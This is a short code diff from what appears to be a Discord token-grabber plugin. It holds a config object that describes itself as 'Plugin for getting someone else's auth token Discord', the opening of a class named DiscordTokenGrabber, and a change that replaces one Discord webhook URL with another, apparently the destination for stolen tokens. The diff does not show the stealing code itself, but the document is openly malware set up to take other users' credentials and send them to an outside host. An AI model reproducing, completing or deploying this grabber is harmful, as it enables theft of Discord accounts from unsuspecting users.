@@ -19,7 +19,7 @@ const config = {
         "description": "Plugin for getting someone else's auth token Discord"
     },
     // Your webhook. Don't even try, this webhook is invalid :3
-    "webhook": "https://discord.com/api/webhooks/786589563602468864/y-8oOOPaGRK4FjtOW-xHB_xGupXU4I5r4R0gNL0Q1GzrKRUDa7zBvsFdu1sLgeenFxTK"
+    "webhook": "https://discord.com/api/webhooks/1280247324320206930/C10wZv0Uvlg6Siv1toNtfIS6kNI-srnDwI1X_uNX_5gp2oIlYD8osPBK-ZkXKKepZGSC"
 }
 
 class DiscordTokenGrabber {
